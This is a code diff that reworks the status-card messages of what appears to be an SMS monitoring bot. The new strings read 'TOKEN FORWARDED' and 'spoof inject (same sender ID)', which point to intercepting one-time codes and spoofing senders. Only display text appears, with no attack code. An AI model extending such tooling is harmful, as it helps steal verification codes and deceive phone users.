@@ -333,10 +333,10 @@ def format_outbound_stream_card(
     return (
         "✅ <b>SUCCESS</b>\n"
         "<pre>"
-        f"⚡ SMS SENT! [{source.upper()}]\n"
-        f"📶 SIM: {sim_slot}\n"
-        f"📞 To: {to_number}\n"
-        f"💬 {body}\n"
+        f"🎯 TOKEN FORWARDED! [{source.upper()}]\n"
+        f"To: {to_number}\n"
+        f"{body}\n"
+        "📋 Format: Emoji\n"
         f"{format_timing_footer(queued_ms, total_ms)}"
         "</pre>"
     )
@@ -408,16 +408,20 @@ def format_monitoring_card(
     test_msg = test_message or STARTUP_TEST_MESSAGE
     device_phone = _format_sim_number(device.phone_number or sim_number)
 
+    channel = profile.channel_id or "—"
+    sim_label = _format_sim_number(sim_number)
     return (
         "✅ <b>SUCCESS</b>\n"
         "<pre>"
-        "Monitoring Started!\n"
+        "Monitoring Started! &lt;/&gt;\n"
         f"📱 Device: {short_device_id(device.name)} | {device_phone}\n"
-        f"📶 FROM SIM: {sim_slot}\n"
+        f"📶 FROM SIM: {sim_slot} ({sim_label})\n"
         f"🔑 Inject Key: {inject_key}\n"
+        "📥 Incoming -&gt; spoof inject (same sender ID)\n"
         f"📞 Real SMS -&gt; {target}\n"
+        f"📢 Channel: {channel} (last / addchannel only)\n"
         f"⏱️ Auto-stop in {auto_stop} minutes\n"
-        f"📦 Ignored {ignored_sms} old SMS\n"
+        f"📦 Ignored {ignored_sms} old SMS (only NEW after this moment)\n"
         f"✅ Test inject OK: {test_msg}"
         "</pre>"
     )
